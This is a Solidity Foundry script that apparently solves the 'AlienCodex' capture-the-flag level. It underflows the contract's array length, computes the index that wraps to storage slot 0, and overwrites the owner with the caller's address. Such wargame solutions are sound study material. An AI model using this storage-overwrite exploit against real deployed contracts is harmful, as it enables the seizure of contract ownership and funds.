// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Script.sol";
import { IAlienCodex } from "src/19_AlienCodex/IAlienCodex.sol";

contract AlienCodexScript is Script {

    IAlienCodex alienCodex;
    address solutionAddress;


    function setUp() public {
        alienCodex = IAlienCodex(0xbcA93F74EE0805e44c75961F802013F3ddDf0F33);
    }

    function run() public {
        vm.startBroadcast();

        alienCodex.make_contact();
        alienCodex.retract();

        uint256 offsetToZeroLocation = _calculateArrayIndex(0);
        address newOwner = tx.origin;

        uint96 contactUint;
        if(alienCodex.contact()) {
            contactUint = 1;
        } else {
            contactUint = 0;
        }
        bytes memory encodedData = abi.encodePacked(contactUint, newOwner);
        bytes32 encodedDataBytes32 = bytes32(encodedData);

        alienCodex.revise(offsetToZeroLocation, encodedDataBytes32);

        assert(alienCodex.owner() == newOwner);

        vm.stopBroadcast();
    }

    function _calculateArrayIndex(uint256 _index) public view returns (uint256) {
        uint storageIndex = 1;
        bytes memory storageIndexBytes = abi.encodePacked(storageIndex);
        bytes32 arrayStorageLocationBytes = keccak256(storageIndexBytes);
        uint256 arrayStorageLocationUint = uint256(arrayStorageLocationBytes);
        uint256 arrayIndex = type(uint256).max - arrayStorageLocationUint + _index + 1;
        return arrayIndex;
    }


}
